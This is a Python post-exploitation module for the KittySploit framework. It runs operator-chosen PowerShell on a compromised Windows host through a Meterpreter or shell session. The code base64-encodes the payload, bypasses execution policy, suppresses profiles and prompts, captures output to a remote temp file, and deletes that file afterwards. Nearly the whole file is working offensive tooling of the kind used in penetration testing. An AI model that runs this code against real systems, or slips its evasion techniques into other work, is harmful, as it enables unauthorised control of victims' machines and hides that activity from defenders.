#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64


class Module(Post):
    __info__ = {
        "name": "Windows PowerShell Exec",
        "description": "Execute a PowerShell command or script on a Windows shell or Meterpreter session and return its output.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
    }

    command = OptString("", "PowerShell command to execute", False)
    script = OptString("", "Inline PowerShell script to execute", False)
    script_file = OptFile("", "Local .ps1 file to read and execute", False)
    no_profile = OptBool(True, "Run PowerShell with -NoProfile", False)
    non_interactive = OptBool(True, "Run PowerShell with -NonInteractive", False)
    output_file = OptString("", "Remote file path to store output (empty = auto temp file)", False)
    cleanup = OptBool(True, "Delete the temporary remote output file when auto-generated", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _remote_temp_dir(self) -> str:
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _powershell_prefix(self) -> str:
        parts = ["powershell"]
        if self.no_profile:
            parts.append("-NoProfile")
        if self.non_interactive:
            parts.append("-NonInteractive")
        parts.append("-ExecutionPolicy")
        parts.append("Bypass")
        return " ".join(parts)

    def _read_script_file(self) -> str:
        if not self.script_file:
            return ""
        if isinstance(self.script_file, list):
            return "".join(self.script_file)
        return str(self.script_file)

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _get_payload(self) -> str:
        inline_script = str(self.script or "").strip()
        file_script = self._read_script_file().strip()
        command = str(self.command or "").strip()

        if inline_script:
            return inline_script
        if file_script:
            return file_script
        if command:
            return command

        raise ProcedureError(FailureType.ConfigurationError, "One of 'command', 'script', or 'script_file' must be set.")

    def _build_wrapper(self, payload: str, out_file: str) -> str:
        out_file_escaped = self._ps_single_quote(out_file)
        return (
            "$ProgressPreference='SilentlyContinue';"
            "$ErrorActionPreference='Continue';"
            f"& {{ {payload} }} 2>&1 | Out-File -FilePath '{out_file_escaped}' -Width 4096 -Encoding UTF8"
        )

    def _read_remote_output(self, out_file: str) -> str:
        return self._execute_cmd(f'type "{out_file}"')

    def check(self):
        ps_check = self._execute_cmd('powershell -NoProfile -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def run(self):
        payload = self._get_payload()
        auto_output = False
        out_file = str(self.output_file or "").strip()
        if not out_file:
            auto_output = True
            out_file = self._remote_temp_dir() + "\\powershell_exec.out"

        wrapped = self._build_wrapper(payload, out_file)
        encoded = self._encode_powershell(wrapped)
        command = f"{self._powershell_prefix()} -EncodedCommand {encoded}"

        print_status("Executing PowerShell payload...")
        self._execute_cmd(command)

        result = self._read_remote_output(out_file)
        if result:
            print_success("PowerShell execution completed")
            print_info(result)
        else:
            print_warning("No output was returned")

        if auto_output and self.cleanup:
            self._execute_cmd(f'del /f /q "{out_file}"')

        return True
